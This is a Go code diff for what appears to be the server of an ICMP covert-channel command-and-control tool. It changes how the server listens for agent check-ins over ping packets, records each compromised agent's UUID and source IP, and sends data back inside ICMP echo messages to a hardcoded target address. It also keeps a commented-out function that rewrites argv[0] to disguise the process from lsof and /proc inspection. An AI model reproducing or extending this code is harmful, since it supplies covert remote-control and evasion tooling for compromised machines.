@@ -38,7 +38,6 @@ const targetIP = "192.168.230.132"
 // To be used as an egg later
 //const secretMessage = "Activate"
 
-// var agentChoice []string
 var activeAgent string
 var conn *icmp.PacketConn
 var listenErr error
@@ -52,7 +51,7 @@ type Agent struct {
 	Platform string
 	UserName string
 	HostName string
-	Ips      []string
+	Ip       string
 	Pid      int
 }
 
@@ -65,7 +64,7 @@ func validateOptions(slice []string, val string) bool {
 	}
 	return false
 }
-func ReadData(packetData string) {
+func ReadData(packetData string, addr string) {
 	//func ReadData(readbuf []byte, packetData int) {
 	var firstCallback = true
 	//src := readbuf[8:packetData]
@@ -86,7 +85,7 @@ func ReadData(packetData string) {
 		firstCallback = false
 	}
 	if firstCallback {
-		_, _ = NewAgentCallback(initialUuid)
+		_, _ = NewAgentCallback(initialUuid, addr)
 	} else {
 		data := [][]string{
 			{string(agentData)},
@@ -98,9 +97,7 @@ func ReadData(packetData string) {
 		table.SetBorder(false)
 		table.SetHeaderLine(true)
 		table.AppendBulk(data)
-		//for _, v := range data {
-		//	table.Append(v)
-		//}
+	
 		fmt.Println()
 		table.Render()
 		color.Set(color.FgGreen)
@@ -134,51 +131,36 @@ func PingListen() {
 	defer conn.Close()
 
 	for {
-		n, _, er := conn.ReadFrom(buf)
+		n, addr, er := conn.ReadFrom(buf)
 		if er != nil {
 			fmt.Println(er)
 		}
-
+		sourceAddr := fmt.Sprintf("%v", addr)
 		rm, err := icmp.ParseMessage(1, buf[:n])
 		if err != nil {
 			fmt.Println(err)
 		}
 
 		body, _ := rm.Body.Marshal(0)
+		
+
 		packetStr := fmt.Sprintf("%x", body)
-
 		packetData := packetStr[8:]
-		ReadData(packetData)
-		//protocol := "icmp"
-		//
-		//netaddr, err := net.ResolveIPAddr("ip4", "0.0.0.0")
-		//if err != nil {
-		//	fmt.Printf("[-] Error in Resolve IPAddr: %s\n\n", err)
-		//}
-		//conn, err = net.ListenIP("ip4:"+protocol, netaddr)
-		//if err != nil {
-		//	fmt.Printf("[-] Error in ListenIP: %s\n\n", err)
-		//}
-
-		//packetData, err := conn.Read(buf)
-		//packetData, _, err := conn.ReadFrom(buf)
-		//if err != nil {
-		//	fmt.Printf("[+] Error reading packet data, %s\n\n", err)
-		//}
-		//log.Info().Int("PingListen", packetData)
+		ReadData(packetData, sourceAddr)
 
 	}
 }
 
-func NewAgentCallback(agentUUID uuid.UUID) (Agent, error) {
+func NewAgentCallback(agentUUID uuid.UUID, agentAddr string) (Agent, error) {
 	var agent Agent
 
-	log.Info().Str("Agent ID", (agentUUID).String()).Msg("New Agent Checked In!")
+	log.Info().Str("Agent ID", (agentUUID).String()).Str("Agent IP", agentAddr).Msg("New Agent Checked In!")
 	if isAgent(agentUUID) {
 		return agent, fmt.Errorf("the %s agent already exists", agentUUID)
 	}
 
 	agent.ID = agentUUID
+	agent.Ip = agentAddr
 
 	// Add agent to global map
 	Agents[agentUUID] = &agent
@@ -200,15 +182,8 @@ func SendData(data string, seq int) {
 			Data: []byte(data),
 		},
 	}
-
-	// Debugging
-	//fmt.Println(data)
-	//fmt.Println([]byte(data))
 	
 	wb, err := wm.Marshal(nil)
-	
-	// Debugging
-	//fmt.Println(wb)
 	
 	if err != nil {
 		log.Fatal().AnErr("Marshal Error", err)
@@ -322,22 +297,40 @@ func main() {
 			}
 		}
 
-		/*
-			// ChangeProcName() is a function that hooks argv[0] and renames it
-			// This will stand out to filesystem analysis such as lsof and the /proc directory
-			func ChangeProcName(name string) error {
-				argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
-				argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]
-
-				n := copy(argv0, name)
-				if n < len(argv0) {
-					argv0[n] = 0
-				}
-
-				return nil
-			}
-		*/
-
 	}
 
 }
+//protocol := "icmp"
+//
+//netaddr, err := net.ResolveIPAddr("ip4", "0.0.0.0")
+//if err != nil {
+//	fmt.Printf("[-] Error in Resolve IPAddr: %s\n\n", err)
+//}
+//conn, err = net.ListenIP("ip4:"+protocol, netaddr)
+//if err != nil {
+//	fmt.Printf("[-] Error in ListenIP: %s\n\n", err)
+//}
+
+//packetData, err := conn.Read(buf)
+//packetData, _, err := conn.ReadFrom(buf)
+//if err != nil {
+//	fmt.Printf("[+] Error reading packet data, %s\n\n", err)
+//}
+//log.Info().Int("PingListen", packetData)
+
+
+		/*
+	// ChangeProcName() is a function that hooks argv[0] and renames it
+	// This will stand out to filesystem analysis such as lsof and the /proc directory
+	func ChangeProcName(name string) error {
+		argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
+		argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]
+
+		n := copy(argv0, name)
+		if n < len(argv0) {
+			argv0[n] = 0
+		}
+
+		return nil
+	}
+*/
